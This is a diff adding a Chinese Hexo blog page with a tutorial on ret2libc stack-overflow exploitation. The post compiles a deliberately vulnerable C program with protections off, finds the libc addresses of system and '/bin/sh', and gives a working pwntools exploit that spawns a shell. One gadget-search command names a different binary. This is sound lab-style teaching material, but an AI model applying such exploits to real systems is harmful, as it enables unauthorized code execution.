@@ -1,0 +1,490 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>栈溢出之ret2libc - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="栈溢出之ret2libc">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-27 20:44" pubdate>
+        2020年2月27日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      839 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">栈溢出之ret2libc</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc</p>
+<h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</p>
+<p>一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目源码：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> _FORTIFY_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br>	<span class="hljs-built_in">read</span>(STDIN_FILENO, buf, <span class="hljs-number">256</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;<br>	<span class="hljs-built_in">vulnerable_function</span>();<br>	<span class="hljs-built_in">write</span>(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">13</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>关闭掉地址随机化和栈保护进行编译：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> ret<span class="hljs-number">2</span>libc.c -g -fno-stack-protector -no-pie -o ret<span class="hljs-number">2</span>libc<span class="hljs-number">64</span><br><span class="hljs-attribute">echo</span> <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure>
+
+<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>使用gdb的checksec查看安全机制</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析程序，read buf局部变量时存在栈溢出问题，但是从题目中直接无法找到任何可利用的代码片段，也有NX保护无法直接执行shellcode，根据前面介绍的ret2libc原理，我们应该在程序的动态链接库里面寻找信息。</p>
+<p>设想，只要在动态链接库中找到system函数，再找到/bin/sh字符串，然后覆盖返回地址跳转到动态链接库的system函数控制执行/bin/sh指令就可以得到shell。</p>
+<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用objdump来在动态链接库中寻找信息。</p>
+<p>1.ldd查看动态链接库</p>
+<p>ldd ret2libc64</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc02.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到使用了libc.so.6，libc库中存在大量的可利用函数，所以我们需要在它里面寻找。</p>
+<p>2.在动态链接库中寻找system地址</p>
+<p>objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc03.png" srcset="/img/loading.gif" lazyload></p>
+<p>3.在动态链接库中寻找”/bin/sh”地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc04.png" srcset="/img/loading.gif" lazyload></p>
+<p>4.找到可控局部变量到返回地址的偏移</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc05.png" srcset="/img/loading.gif" lazyload></p>
+<p>0xfe290-0xfe210+0x8=0x88</p>
+<p>记录一下得到的信息：</p>
+<ul>
+<li>libc.so.6的基准地址是0x7fbf4cfcf000</li>
+<li>libc_system函数的偏移是0x435d0，那么它的实际地址就是0x7FBF4D0125D0</li>
+<li>/bin/sh字符串的偏移是0x17f573，那么它的实际地址就是0x7FBF4D14E573</li>
+<li>可控变量到返回地址的偏移是0x88</li>
+</ul>
+<p>接下来就可以构造payload了</p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们需要使返回地址指向system函数，然后system函数被调用时，rbp后面会紧跟着system的返回地址，然后再跟着system函数的入参，所以payload就是局部变量到返回地址的偏移padding1，然后libc_system的地址覆盖返回地址，后面接着一个8字节随意填充的padding2，再接上入参/bin/sh</p>
+<p>payload = padding1+system+padding2+”/bin/sh”</p>
+<p>payload =”A”*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</p>
+<p>然后写出exp:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">sh</span> = process(&#x27;./ret<span class="hljs-number">2</span>libc<span class="hljs-number">64</span>&#x27;)<br><br><span class="hljs-attribute">system_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>FBF<span class="hljs-number">4</span>D<span class="hljs-number">0125</span>D<span class="hljs-number">0</span><br><span class="hljs-attribute">binsh_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>FBF<span class="hljs-number">4</span>D<span class="hljs-number">14</span>E<span class="hljs-number">573</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+p<span class="hljs-number">64</span>(system_addr)+p<span class="hljs-number">64</span>(<span class="hljs-number">123</span>)+p<span class="hljs-number">64</span>(binsh_addr)<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行exp即可获取shell</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/rop/">rop</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84redos%E9%97%AE%E9%A2%98/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">正则表达式导致的redos问题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/02/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/">
+                        <span class="hidden-mobile">栈溢出之ret2syscall</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
